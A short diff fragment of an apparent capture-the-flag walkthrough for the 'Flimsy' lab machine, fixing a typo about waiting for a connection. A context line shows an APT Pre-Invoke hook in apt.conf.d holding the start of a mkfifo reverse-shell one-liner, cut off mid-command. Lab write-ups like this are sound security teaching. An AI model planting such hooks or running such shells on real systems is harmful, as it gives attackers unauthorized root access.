@@ -471,7 +471,7 @@ APT::Update::Pre-Invoke {"rm /tmp/cajac;mkfifo /tmp/cajac;cat /tmp/cajac|/bin/ba
 franklin@flimsy:/etc/apt/apt.conf.d$ 
 ```
 
-Next, we wait a minute for the connection aminute or so
+Next, we wait a minute for the connection
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Flimsy]
